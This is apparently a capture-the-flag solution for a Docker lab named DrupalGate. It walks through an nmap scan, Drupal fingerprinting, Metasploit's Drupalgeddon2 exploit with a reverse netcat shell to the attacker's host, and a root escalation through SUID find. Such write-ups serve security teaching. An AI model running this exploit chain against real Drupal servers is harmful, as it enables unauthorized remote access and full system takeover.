# DrupalGate Docker Solution

Start with a scan:

```bash
nmap -sV -p- 127.0.0.1
```

HTTP is exposed on host port `8080`, SSH on `2222`, and RPC on `1111`.

Visit:

```text
http://127.0.0.1:8080
```

Drupal can be identified from the realistic site template, page source and:

```text
http://127.0.0.1:8080/CHANGELOG.txt
```

Use Metasploit's Drupalgeddon2 module:

```text
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 127.0.0.1
set RPORT 8080
set TARGETURI /
set TARGET "Drupal 7.x (Unix In-Memory)"
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <your-vpn-or-local-ip>
run
```

Once you have a shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
whoami
cat /home/flaguser/flag1.txt
find / -perm -u=s -type f 2>/dev/null
```

The intended privilege escalation is `/usr/bin/find`:

```bash
cd /tmp
touch drupalgate
/usr/bin/find drupalgate -exec /bin/bash -p \; -quit
whoami
cat /root/thefinalflag.txt
```
